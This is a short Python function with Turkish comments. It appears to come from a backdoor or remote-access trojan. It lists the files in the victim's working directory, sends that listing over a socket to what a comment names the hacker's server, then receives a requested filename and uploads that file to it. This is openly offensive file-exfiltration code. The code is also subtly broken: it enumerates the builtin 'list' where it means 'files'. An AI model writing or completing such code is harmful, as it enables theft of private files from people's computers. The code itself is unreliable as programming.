
from glob import glob
import json

DELIMETER = "<END_OF_RESULTS>"


def upload_file_folder(my_socket):
    print("[+] Dosya Sunucuya gonderiliyor")

    files = glob("*")

    # dosyalar icin dictinory
    dict = {}

    for index, file in enumerate(list):
        dict[index] = file

    # Serilization of dict

    dict_bytes = json.dumps(dict)
    byte_delimeter = dict_bytes + DELIMETER

    raw_bytes = byte_delimeter.encode()

    my_socket.socket.send(raw_bytes)

    # File_folder_donwload dosyasindan dosya numarasinin (data) alma
    filename = my_socket.receive_data()

    # Sunucuya  (Hackere) Dosya gonderme

    my_socket.send_file(filename)
